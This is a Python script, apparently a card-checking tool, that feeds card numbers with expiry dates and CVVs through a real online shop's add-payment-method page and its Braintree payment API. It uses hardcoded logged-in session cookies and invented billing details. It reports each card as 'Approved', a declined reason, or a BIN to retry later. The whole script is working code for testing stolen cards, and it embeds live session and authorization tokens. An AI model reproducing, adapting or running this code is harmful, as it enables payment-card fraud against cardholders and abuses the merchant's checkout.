def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def Tele(ccx):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder 		import MultipartEncoder
	
	
	ccx = ccx.strip()
	parts = re.split('[|/:]', ccx)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	user = user_agent.generate_user_agent()

	cookies = {
    'cmplz_consented_services': '',
    'cmplz_policy_id': '1',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    '_gcl_au': '1.1.398331465.1715462987',
    '_ga': 'GA1.1.1072405866.1715462992',
    '_fbp': 'fb.1.1715462993103.2125891886',
    '_pin_unauth': 'dWlkPU1XWTBOMkZtTW1NdE9EQmxZUzAwT0dNeExXRmtZVFl0TVRjNU5HTTJNelkxWm1SaQ',
    'MCPopupClosed': 'yes',
    'mailchimp_landing_site': 'https%3A%2F%2Fhusbands-paris.com%2Fen%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    '_clck': 'rlpr1c%7C2%7Cfmn%7C0%7C1592',
    'njt-close-notibar': 'true',
    'mailchimp_user_previous_email': 'xheihbiknn%40gmail.com',
    'mailchimp_user_email': 'xheihbiknn%40gmail.com',
    'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'xheihbiknn%7C1719635548%7CmQGzuszyYbarEI1b9Y0gYcoQB63DEaMpvEzB4ORxFNq%7C806c86118cee55ea5423cd6ff975964d03f89077e60e4209fde8c5aa6f2fffc1',
    'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'xheihbiknn%7C1719635548%7CmQGzuszyYbarEI1b9Y0gYcoQB63DEaMpvEzB4ORxFNq%7C2b76679e589ce703c2549e1ee3838f3d5ba3248c6f9e58be636d7c8924e317c3',
    'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '15285%7C%7C1718598550%7C%7C1718594950%7C%7Cc10f475a658fc5120ebb1c195b7711be',
    'tinvwl_wishlists_data_counter': '0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-15%2004%3A50%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-06-15%2004%3A50%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_MADEBYTALHA': 'GS1.1.1718425935.6.1.1718427039.0.0.512405709',
    '_ga_PVNDMDZCW4': 'GS1.1.1718425936.6.1.1718427039.60.0.0',
    '_clsk': '10q1hhz%7C1718427041169%7C1%7C1%7Cw.clarity.ms%2Fcollect',
    'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '15285%7Cother%7C%7Cd29abe74d2863f9a30a9d0295ec8324e1cc1eb18beff25e602e2711634d2c07c',
    'tinv_wishlistkey': '720c1a',
    'woocommerce_items_in_cart': '1',
}

	headers = {
    'authority': 'husbands-paris.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://husbands-paris.com',
    'referer': 'https://husbands-paris.com/en/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}


	res1 = requests.post(
    'https://husbands-paris.com/en/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,)
	r4 = res1.text
	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
	T = capture(r4,'wc_braintree_client_token = ["','"]')
	encoded_text = T
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'b9e4d443-6d1b-47c0-9035-ca54ba16cd56',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'new street 7',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	token = res2.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://husbands-paris.com',
    'referer': 'https://husbands-paris.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'en-US',
    'browserScreenHeight': 873,
    'browserScreenWidth': 393,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'billingLine1': 'new street 7',
        'billingLine2': '',
        'billingCity': 'new york',
        'billingState': 'NY',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '+201201094509',
        'billingGivenName': 'zezo',
        'billingSurname': 'neno',
        'email': 'xheihbiknn@gmail.com',
    },
    'bin': '546316',
    'dfReferenceId': '1_22826fde-4847-4407-aa9b-4a7c64c8e378',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.101.1',
        'cardinalDeviceDataCollectionTimeElapsed': 190,
        'issuerDeviceDataCollectionTimeElapsed': 6864,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.101.1',
    '_meta': {
        'merchantAppId': 'husbands-paris.com',
        'platform': 'web',
        'sdkVersion': '3.101.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'b9e4d443-6d1b-47c0-9035-ca54ba16cd56',
    },
}

	res3 = requests.post(
    f'https://api.braintreegateway.com/merchants/tqrv56bq2khzqk35/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)





	nonce = res3.json()['paymentMethod']['nonce']
    
    




	


	cookies = {
    'cmplz_consented_services': '',
    'cmplz_policy_id': '1',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    '_gcl_au': '1.1.398331465.1715462987',
    '_ga': 'GA1.1.1072405866.1715462992',
    '_fbp': 'fb.1.1715462993103.2125891886',
    '_pin_unauth': 'dWlkPU1XWTBOMkZtTW1NdE9EQmxZUzAwT0dNeExXRmtZVFl0TVRjNU5HTTJNelkxWm1SaQ',
    'MCPopupClosed': 'yes',
    'mailchimp_landing_site': 'https%3A%2F%2Fhusbands-paris.com%2Fen%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    '_clck': 'rlpr1c%7C2%7Cfmn%7C0%7C1592',
    'njt-close-notibar': 'true',
    'mailchimp_user_previous_email': 'xheihbiknn%40gmail.com',
    'mailchimp_user_email': 'xheihbiknn%40gmail.com',
    'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'xheihbiknn%7C1719635548%7CmQGzuszyYbarEI1b9Y0gYcoQB63DEaMpvEzB4ORxFNq%7C806c86118cee55ea5423cd6ff975964d03f89077e60e4209fde8c5aa6f2fffc1',
    'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'xheihbiknn%7C1719635548%7CmQGzuszyYbarEI1b9Y0gYcoQB63DEaMpvEzB4ORxFNq%7C2b76679e589ce703c2549e1ee3838f3d5ba3248c6f9e58be636d7c8924e317c3',
    'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '15285%7C%7C1718598550%7C%7C1718594950%7C%7Cc10f475a658fc5120ebb1c195b7711be',
    'tinvwl_wishlists_data_counter': '0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-15%2004%3A50%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-06-15%2004%3A50%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'tinv_wishlistkey': '720c1a',
    'sbjs_session': 'pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_MADEBYTALHA': 'GS1.1.1718425935.6.1.1718427073.0.0.512405709',
    '_clsk': '10q1hhz%7C1718427074108%7C2%7C1%7Cw.clarity.ms%2Fcollect',
    'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '15285%7Cother%7C%7Cd29abe74d2863f9a30a9d0295ec8324e1cc1eb18beff25e602e2711634d2c07c',
    'woocommerce_items_in_cart': '1',
    '_ga_PVNDMDZCW4': 'GS1.1.1718425936.6.1.1718427211.48.0.0',
}

	headers = {
    'authority': 'husbands-paris.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://husbands-paris.com',
    'referer': 'https://husbands-paris.com/en/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonce,
    'braintree_cc_device_data': '{"device_session_id":"925373fc79fb835ff0cd3650b9e6f201","fraud_merchant_id":null,"correlation_id":"f49945ee0b6c8c0d34f95a5127d67e4b"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/tqrv56bq2khzqk35/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/tqrv56bq2khzqk35"},"merchantId":"tqrv56bq2khzqk35","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"USD","merchantIdentifier":"tqrv56bq2khzqk35","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkY2IwNGQ0Ni1hYWY0LTQ3NDEtODU1Yy01MWJlNDMxZmRjNzgiLCJpYXQiOjE3MTg0MjY4NTEsImV4cCI6MTcxODQzNDA1MSwiaXNzIjoiNjU3YTRiZjEwYmJmYWI0NmQ3MjhjY2U5IiwiT3JnVW5pdElkIjoiNjU3YTRiZjEzYzJmNTE1ZTAyZWMxMjViIn0.Z-OurPFHEAFPHA-PLBDVuF7JGNRkBmz-CyXCpnhNg1A"},"androidPay":{"displayName":"Husbands Paris","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg1MTMyNTEsImp0aSI6IjU4NWYwMTc2LTQ2NTctNGMwYS1hMTM3LWE4ZDFkYzM0YjYwOCIsInN1YiI6InRxcnY1NmJxMmtoenFrMzUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRxcnY1NmJxMmtoenFrMzUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.PK2pUJ_1bvXqmjZn0hjlQP11CL52Jc0Z8hkzTCnTVW8w6Ag4aMZZ0E5W35Ookcbb4ezmKeT7_B75MAKi1s9Slw","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Husbands Paris","clientId":"AQ1508abMajQ4VRW2xqHw8nO0k4lTpyoOdC3blQptbuIpZXlzlgW4aR6lv3ClGVXN6lKeM0tKkd5_vT1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"husbandsparisUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': anonce,
    '_wp_http_referer': '/en/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://husbands-paris.com/en/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
			
	return result
	
	

